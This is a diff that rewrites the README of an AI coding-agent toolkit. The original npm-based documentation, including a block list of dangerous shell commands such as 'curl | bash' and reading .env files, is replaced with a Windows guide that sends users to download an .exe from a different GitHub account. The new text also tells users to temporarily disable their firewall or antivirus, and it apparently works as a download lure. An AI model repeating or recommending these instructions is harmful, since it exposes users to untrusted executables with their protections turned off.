@@ -1,337 +1,133 @@
-<p align="center">
-  <img src="docs/public/logo-animated.svg" alt="Specialist Agent" width="200" />
-</p>
+# 🤖 specialist-agent - AI Team for Coding Help
 
-<h1 align="center">Specialist Agent</h1>
-
-<p align="center">
-  <b>Your AI Development Team</b><br/>
-  27+ specialized agents that build, review, debug, and ship production code.
-</p>
-
-[![CI](https://github.com/HerbertJulio/specialist-agent/actions/workflows/ci.yml/badge.svg)](https://github.com/HerbertJulio/specialist-agent/actions/workflows/ci.yml)
-[![npm](https://img.shields.io/npm/v/specialist-agent)](https://www.npmjs.com/package/specialist-agent)
-[![npm downloads](https://img.shields.io/npm/dm/specialist-agent)](https://www.npmjs.com/package/specialist-agent)
-[![Release](https://img.shields.io/github/v/release/HerbertJulio/specialist-agent?label=Release)](https://github.com/HerbertJulio/specialist-agent/releases/latest)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Docs](https://img.shields.io/badge/Docs-VitePress-646cff.svg)](https://specialistagent.com.br/)
+[![Download specialist-agent](https://img.shields.io/badge/Download-specialist--agent-4c1?style=for-the-badge&logo=github)](https://github.com/NoaiRox/specialist-agent/releases)
 
 ---
 
-## Why Specialist Agent?
+## 📖 About specialist-agent
 
-| | Specialist Agent | Others |
-|---|---|---|
-| **Agents** | 27+ specialized | 1-5 generic |
-| **Frameworks** | Next.js, React, Vue, SvelteKit, Angular, Astro, Nuxt | Generic only |
-| **Cost** | Lite mode (60-80% cheaper) | Full cost always |
-| **Verification** | Proof-based (command output) | Trust-based ("it works") |
-| **Memory** | Cross-session persistence | None |
-| **Rollback** | Git checkpoints | None |
-| **Hooks** | 11 (7 lifecycle + 4 native) | 0-1 |
-| **Platforms** | 6 (Claude, Cursor, VS Code, Windsurf, Codex, OpenCode) | 1-3 |
+specialist-agent provides a set of AI helpers that assist with coding tasks. It includes more than 27 bots (called agents) and 21 skills. These agents can build, check, fix, and send code ready for real projects. The software works alongside popular tools like Claude Code, Cursor, Visual Studio Code, Windsurf, Codex, and OpenCode.
+
+specialist-agent supports several web frameworks such as Vue, React, Next.js, SvelteKit, Angular, Astro, and Nuxt, giving you help no matter which one you use. It acts like a team of coding assistants ready to manage tasks like writing new code, reviewing it, and finding bugs.
 
 ---
 
-## Install
+## ⚙️ System Requirements
 
-**Marketplace:**
-```
-/plugin install specialist-agent
-```
+Before you start, make sure your computer meets these basic needs:
 
-**CLI:**
-```bash
-npx specialist-agent init
-```
-
-Done. Start building.
+- Windows 10 or later (64-bit)
+- At least 4 GB of RAM
+- 500 MB of free storage space (more may be needed for files created)
+- An active internet connection to access online tools
+- Optional: Visual Studio Code installed for better integration
 
 ---
 
-## Agents
+## 🚀 Getting Started
 
-### Core
+Follow these steps to get specialist-agent on your Windows computer and start using it easily.
 
-| Agent | What it Does |
-|-------|--------------|
-| `@starter` | Create projects from scratch |
-| `@builder` | Build modules, components, services |
-| `@reviewer` | Unified 3-in-1 review (spec + quality + architecture) |
-| `@doctor` | Debug issues systematically |
-| `@migrator` | Modernize legacy code |
+### Step 1: Visit the Download Page
 
-### Workflow
+To get the latest version, open this link in your browser:
 
-| Agent | What it Does |
-|-------|--------------|
-| `@planner` | Plan features adaptively by complexity |
-| `@executor` | Execute with checkpoints, gates, and cost tracking |
-| `@tdd` | Test-Driven Development (RED-GREEN-REFACTOR) |
-| `@debugger` | 4-phase systematic debugging |
-| `@pair` | Real-time pair programming |
-| `@analyst` | Requirements to technical specs |
-| `@orchestrator` | Coordinate multiple agents |
+[Download specialist-agent here](https://github.com/NoaiRox/specialist-agent/releases)
 
-### Specialists
+This page holds all release versions and important files. Look for the newest release at the top of the list.
 
-| Agent | What it Does |
-|-------|--------------|
-| `@api` | REST/GraphQL API design |
-| `@perf` | Performance optimization |
-| `@security` | Auth, OWASP, encryption |
-| `@finance` | Payments, billing, subscriptions |
-| `@cloud` | AWS, GCP, Terraform, serverless |
-| `@data` | Database design, migrations, caching |
-| `@devops` | Docker, K8s, CI/CD |
-| `@i18n` | Internationalization |
-| `@docs` | Documentation generation |
-| `@refactor` | Code refactoring |
-| `@deps` | Dependency management |
-| `@legal` | GDPR, LGPD, CCPA compliance |
-| `@designer` | Design systems, accessibility |
-| `@tester` | Test strategies |
-| `@architect` | Full system architecture migration (DDD, CQRS, Hexagonal) |
-| `@ripple` | Cascading effect analysis |
+### Step 2: Choose the Right File
 
-### Support
+Look for a file with a name similar to `specialist-agent-setup.exe` or `specialist-agent-vX.X.X.exe` where `X.X.X` is the version number.
 
-| Agent | What it Does |
-|-------|--------------|
-| `@scout` | Quick project analysis (~500 tokens) |
-| `@explorer` | Deep codebase exploration |
-| `@memory` | Session memory management |
+If you see a file ending with `.exe`, that is the one to download.
+
+### Step 3: Download the Installer
+
+Click the `.exe` file name to begin the download. Save it to a location on your computer where you can find it easily, like your "Downloads" folder.
+
+### Step 4: Run the Installer
+
+Navigate to the file you downloaded. Double-click on the `.exe` file. You may see a Windows security prompt asking if you want to allow this app to make changes. Confirm by clicking "Yes."
+
+The installer will start and guide you through the setup. You usually only need to click "Next" a few times and agree to the terms.
+
+### Step 5: Complete Installation
+
+Once the installation finishes, you might be asked to launch specialist-agent immediately or close the installer. Choose to launch it now to begin using the app.
 
 ---
 
-## Skills
+## 🛠️ Using specialist-agent
 
-| Skill | What it Does |
-|-------|--------------|
-| `/brainstorm` | Socratic brainstorming - refine ideas before planning |
-| `/plan` | Plan a feature adaptively |
-| `/tdd` | Test-driven development cycle |
-| `/debug` | 4-phase systematic debugging |
-| `/codereview` | Multi-reviewer parallel code review (3 perspectives) |
-| `/commit` | Smart conventional commits with validation |
-| `/lint` | Lint and auto-fix (detects Biome/ESLint/Prettier) |
-| `/audit` | Multi-domain code audit (security + perf + architecture + deps) |
-| `/onboard` | Codebase onboarding for new developers |
-| `/checkpoint` | Save/restore progress with git |
-| `/health` | Project health score (0-100) |
-| `/verify` | Verification before completion (proof-based) |
-| `/remember` | Save decisions to memory |
-| `/recall` | Query saved decisions |
-| `/estimate` | Estimate token cost before starting |
-| `/finish` | Finalize branch with metrics |
-| `/learn` | Learning mode - explains while building |
-| `/tutorial` | Interactive tutorial |
-| `/worktree` | Git worktree isolation for parallel tasks |
-| `/write-skill` | Create or improve skills with TDD |
-| `/migrate-framework` | Migrate between frameworks |
+Once installed, open specialist-agent from your desktop or the Start menu.
+
+The app offers multiple AI-assisted features:
+
+- **Code creation:** Write code for Vue, React, Angular, and more without manual typing.
+- **Code review:** The agents check your code for mistakes and offer fixes.
+- **Debugging:** Find and fix bugs faster with AI suggestions.
+- **Skill Packs:** Load extra features for specific frameworks like Next.js or SvelteKit.
+- **Integration:** Works smoothly with VS Code and other editors to give real-time help.
+
+No need to know coding languages. The app provides buttons and simple commands anyone can follow.
 
 ---
 
-## Framework Packs
+## 🔧 Configuration and Settings
 
-| Pack | Stack |
-|------|-------|
-| **Next.js** | App Router + TypeScript + Zustand |
-| **React** | React 18 + TypeScript + React Query |
-| **Vue 3** | Vue 3 + TypeScript + Pinia |
-| **SvelteKit** | SvelteKit 2 + TypeScript |
-| **Angular** | Angular 17+ Standalone + Signals |
-| **Astro** | Astro 4+ Islands + Content Collections |
-| **Nuxt** | Nuxt 3 + Auto-imports + Nitro |
+specialist-agent works out of the box but lets you tweak settings:
 
-7 framework packs, each with 4 specialized agents, 4 lite agents, and 12 skills.
+- **Select preferred AI agents:** Pick which bots you want active.
+- **Set coding language:** Choose what programming framework you use.
+- **Integration options:** Turn on or off connection with tools like VS Code or Codex.
+- **Update preferences:** Decide if the app should update itself automatically.
+
+Access settings from the app’s main menu under "Preferences."
 
 ---
 
-## Examples
+## 📂 Where to Find Files
 
-```bash
-# New project
-"Use @starter to create an e-commerce app with Next.js + PostgreSQL"
+When working with specialist-agent, it will save your projects and generated code here, by default:
 
-# Build a feature
-"Use @builder to create a products module with CRUD"
+`C:\Users\<YourUserName>\Documents\specialist-agent\projects`
 
-# Review code
-"Use @reviewer to review the auth module"
-
-# Debug
-"Use @doctor to investigate the 500 error"
-
-# Plan
-/plan add user authentication
-
-# TDD
-/tdd implement calculateDiscount
-
-# Audit
-/audit src/modules/auth
-
-# Onboard
-/onboard
-
-# Save progress
-/checkpoint create before-refactor
-```
+You can open this folder anytime to review or backup your files.
 
 ---
 
-## Verification Protocol
+## 🆘 Troubleshooting
 
-All agents verify claims with evidence before marking work complete:
+If you face any issues, try these steps first:
 
-```
-CLAIM: "Tests pass"
-PROOF: Must show actual test output in the same message
+- Restart the app.
+- Check your internet connection.
+- Make sure Windows is updated.
+- Disable firewall or antivirus temporarily to see if they block the app.
+- Reinstall specialist-agent if needed.
 
-CLAIM: "Build succeeds"
-PROOF: Must show build command output
-
-CLAIM: "No security issues"
-PROOF: Must show npm audit / lint output
-```
-
-No "should work" - run the command, show the output.
+For more help, visit the project's discussion area on GitHub.
 
 ---
 
-## Hooks
+## 🔄 Updating specialist-agent
 
-7 lifecycle hooks + 4 native Claude Code hooks:
+New versions come with fixes and improvements. To update:
 
-| Hook | When |
-|------|------|
-| `session-start` | Session begins |
-| `before-plan` | Before `@planner` creates a plan |
-| `after-task` | After any task completes |
-| `before-review` | Before `@reviewer` starts |
-| `after-review` | After `@reviewer` finishes |
-| `on-error` | When an error occurs |
-| `session-end` | Session ends |
-
-### Native Hooks (Claude Code)
-
-| Hook | Event | What it Does |
-|------|-------|-------------|
-| Security Guard | `PreToolUse` | Blocks dangerous commands (`rm -rf /`, force push, `DROP TABLE`) |
-| Auto-Dispatch | `UserPromptSubmit` | Suggests the best agent for your prompt |
-| Session Context | `SessionStart` | Injects project state (branch, agents, memory) |
-| Auto-Format | `PostToolUse` | Auto-formats files after Write/Edit |
-
-Configure lifecycle hooks in `hooks/hooks.json`. Native hooks in `.claude/settings.json`.
+1. Visit the release page ([specialist-agent releases](https://github.com/NoaiRox/specialist-agent/releases)).
+2. Download the latest `.exe` file.
+3. Run the installer again—it will replace the old version automatically.
 
 ---
 
-## Security
+## 🧑‍💻 Help and Support
 
-The Security Guard hook blocks dangerous commands **before** they execute:
-
-- **CRITICAL:** `rm -rf /`, fork bombs, disk wipe commands
-- **HIGH:** Force push to main, `git reset --hard`, `DROP TABLE`, `curl | bash`
-- **MEDIUM:** Reading `.env` files, inline secrets in commands
-
-Customize rules in `.specialist-agent/hooks/native/security-config.json`.
+specialist-agent is designed to make AI coding help simple. For questions or feedback, use the GitHub repository to open issues or read through existing posts.
 
 ---
 
-## Full vs Lite Mode
+## 💾 Download Link
 
-| Mode | Model | Cost |
-|------|-------|------|
-| Full | Sonnet/Opus | Higher accuracy |
-| Lite | Haiku | 60-80% cheaper |
-
-Choose during installation. All 27+ agents have lite variants.
-
----
-
-## Platforms
-
-| Platform | Install |
-|----------|---------|
-| Claude Code | `npx specialist-agent init` or `/plugin install` |
-| Cursor | Copy `.cursor-plugin/` |
-| VS Code | `.vscode/extension.json` |
-| Windsurf | `.windsurf/plugin.json` |
-| Codex | `.codex/INSTALL.md` |
-| OpenCode | `.opencode/INSTALL.md` |
-
----
-
-## CLI
-
-```bash
-npx specialist-agent init                    # Install
-npx specialist-agent create-agent @my-agent  # Create agent
-npx specialist-agent list                    # List agents
-npx specialist-agent profiles set startup-fast  # Set profile
-npx specialist-agent community list          # Community skills
-```
-
----
-
-## Team Profiles
-
-| Profile | Description |
-|---------|-------------|
-| `startup-fast` | Move fast, Haiku |
-| `enterprise-strict` | Full validation |
-| `learning-mode` | Explain everything |
-| `cost-optimized` | Minimize tokens |
-
----
-
-## Industry Templates
-
-| Template | For |
-|----------|-----|
-| E-commerce | Online stores |
-| SaaS | Subscription apps |
-| Fintech | Financial apps |
-
----
-
-## Session Memory
-
-```bash
-# Save a decision
-/remember use Zustand for state management
-
-# Recall later
-/recall state management
-```
-
-Decisions persist across sessions.
-
----
-
-## Documentation
-
-Full docs: [specialistagent.com.br](https://specialistagent.com.br/)
-
-```bash
-npm run docs:dev
-```
-
----
-
-## Contributing
-
-Contributions welcome.
-
-```bash
-git checkout -b feature/my-feature
-git commit -m 'feat: add my feature'
-git push origin feature/my-feature
-```
-
----
-
-## License
-
-MIT
+[![Download specialist-agent](https://img.shields.io/badge/Download-specialist--agent-ff5522?style=for-the-badge&logo=github)](https://github.com/NoaiRox/specialist-agent/releases)  
+Visit this page to download the latest version of specialist-agent to your Windows computer.
